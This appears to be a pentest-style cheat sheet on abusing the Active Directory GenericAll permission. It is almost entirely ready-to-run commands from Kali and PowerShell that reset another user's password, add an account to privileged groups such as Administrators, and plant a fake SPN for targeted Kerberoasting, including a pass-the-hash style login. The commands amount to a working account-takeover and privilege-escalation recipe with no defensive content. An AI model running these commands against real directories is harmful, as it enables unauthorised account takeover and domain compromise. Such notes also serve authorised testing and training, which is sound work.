**GenericAll** is a powerful permission in Active Directory. It means the principal (user/group) has **full control** over the target object.

With GenericAll, you can modify any attribute of the object, including sensitive ones like `servicePrincipalName`, `memberOf`, or even reset the password.


---


## Abusing GenericAll from Kali 

### 1. Reset a User’s Password

If you have **GenericAll** over a user object, you can reset their password without knowing the old one.

- Using **BloodyAD**:

```bash
bloodyAD --host 172.16.1.15 -d bloody.local -u jane.doe -p :NTLMHASH set password targetuser 'NewPass123!'
```

- Using **impacket** (`rpcclient` or `net`):

```bash
rpcclient -U <your_user>%<your_pass> <dc_ip>
rpcclient $> setuserinfo2 <target_user> 23 '<NewPassword>'
```

- Using **net rpc**:

```bash
net rpc password <target_user> <NewPassword> -U <your_user>%<your_pass> -S <dc_ip>
```


After this, you can authenticate as `<target_user>` with the new password.

---

### 2. Add Yourself to a Group

If you have **GenericAll** over a group object, you can add your account to that group.

- With **BloodyAD**:

```bash
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH add groupMember 'Administrators' targetuser
```

- With **rpcclient**:

```bash
rpcclient -U <your_user>%<your_pass> <dc_ip>
rpcclient $> addgroupmem <GroupName> <YourUser>
```

- With **net rpc**:

```bash
net rpc group addmem "<GroupName>" <YourUser> -U <your_user>%<your_pass> -S <dc_ip>
```

---

### 3. Modify SPNs for Kerberoasting

If you have **GenericAll** over a user/computer account, you can set a fake SPN and then request a service ticket.

- With **impacket-setspn**:

```bash
setspn.py <domain>/<your_user>:<your_pass>@<dc_ip> -setspn "HTTP/fake" <target_user>
```

- Then request a TGS for Kerberoasting:

```bash
GetUserSPNs.py <domain>/<your_user>:<your_pass>@<dc_ip> -request
```


---


## Abusing GenericAll from PowerShell


### 1. Resetting a User’s Password

- If you have GenericAll over a user account, you can reset their password without knowing the old one.
- Example (using `net user`):

```bash
net user <target_user> <new_password> /domain
```

- After that, you can log in as the target user with the new password.

### 2. Adding Yourself to a Group

- If you have GenericAll over a group object, you can add your account to that group.
- Example (PowerShell):

```powershell
Add-ADGroupMember -Identity "<GroupName>" -Members "<YourUser>"
```

- Useful if the group has privileged rights (e.g., Domain Admins).


### 3. Modifying Service Principal Names (SPNs)

- With GenericAll over a user/computer account, you can set an SPN.
- This allows you to perform **Kerberoasting** attacks.
- Example:

```powershell
Set-ADUser -Identity <target_user> -ServicePrincipalNames @{Add="HTTP/fake"}
```

